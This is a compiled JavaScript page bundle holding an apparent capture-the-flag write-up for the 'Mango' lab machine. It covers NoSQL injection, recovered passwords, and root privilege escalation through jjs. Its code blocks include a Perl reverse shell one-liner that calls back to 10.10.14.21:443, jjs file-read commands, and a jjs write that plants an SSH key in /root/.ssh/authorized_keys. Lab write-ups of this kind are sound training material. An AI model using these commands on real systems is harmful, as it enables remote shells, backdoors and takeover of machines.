(window.webpackJsonp=window.webpackJsonp||[]).push([[83],{423:function(s,a,e){"use strict";e.r(a);var t=e(13),r=Object(t.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"mango"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#mango"}},[s._v("#")]),s._v(" Mango")]),s._v(" "),a("p",[s._v("IP: "),a("code",[s._v("10.10.10.162")])]),s._v(" "),a("p",[s._v("NoSQL injection vulnerability")]),s._v(" "),a("p",[s._v("Using a custom script:")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("Username: admin\nPassword: t9KcS"),a("span",{pre:!0,attrs:{class:"token operator"}},[a("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[s._v("3")]),s._v(">")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("0B"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#2")]),s._v("\n\nUsername: mango\nPassword: h3mXK8RhU~f"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("f5H\n")])])]),a("p",[s._v("Sshing with admin doesn't work, but\nsshing with mango's username and password works.")]),s._v(" "),a("p",[s._v("Once in and running linpeas, we see that jjs is exploitable but we can't run it. Checking the permissions of the file reveals that only admin can run it.")]),s._v(" "),a("p",[s._v("trying to switch user to admin works with admin's password.")]),s._v(" "),a("h2",{attrs:{id:"priv-esc"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[s._v("#")]),s._v(" Priv esc")]),s._v(" "),a("p",[a("strong",[s._v("File reads:")])]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'var BufferedReader = Java.type("java.io.BufferedReader");\nvar FileReader = Java.type("java.io.FileReader");\nvar br = new BufferedReader(new FileReader("/var/log/syslog"));\nwhile ((line = br.readLine()) != null) { print(line); }\'')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" jjs\n")])])]),a("p",[a("strong",[s._v("File write:")])]),s._v(" "),a("p",[s._v("Create a script:")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("perl "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-e")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'use Socket;$i="10.10.14.21";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'')]),s._v("\n")])])]),a("p",[s._v("ssh-keygen")]),s._v(" "),a("p",[s._v("write public key to file "),a("code",[s._v("/root/.ssh/authorized_keys")]),s._v(":")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('\'var FileWriter = Java.type("java.io.FileWriter");\nvar fw = new FileWriter("/root/.ssh/authorized_keys");\nfw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBsCUE9ZPdL0DPy2+mWekUIzFMnjmpR+2Kprk0uE4f0AfTuKiZ+EMlUfYsrbJiZLRDH86/5jWzcjmj/PKH1bnTdI9gjJPFebovpynUUjmblLaFn1U0ZGcUQ2/b/EIsGtB1Q4/I2SIupF683bZunla3qt04TXf9xB8CH5ofkUYqa9ITRt6Om83AB+5XZU+Ej8MBVYcc1Cxgzv0xeps8rXQj4NThudjlifxdqGXnErY9jid4g5FrBL3U7PXCoF+YEUQbirYYXUb1rVYU0btLPPHlF2c/2eA3ef2/SyX/6awTPiW9OkCJMaySQj1HIlmdbiVpDe7+V9hQ6S7gF8lHEb3lZq2D4wDh1Fxzfxo31t4rKxtWfuEVf+UQhzilNY3uXoOTcT+FK3uBkKy+dhTS8w9hv9GB5/+fXn5W2h29Z+U5UYE/AkVnwmVkRZ1uuG1qOYTy1uUTgtQTnOuH2bIvvpIEDCVc61zj2CUjX9u26lHuoeH0HKlM45qgGdssd6maMnk=");\nfw.close();\'')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" jjs\n")])])]),a("p",[s._v("now ssh with the private key:")]),s._v(" "),a("div",{staticClass:"language-sh extra-class"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v(" private_key root@10.10.10.162\n")])])]),a("p",[s._v("and we get root.")])])}),[],!1,null,null,null);a.default=r.exports}}]);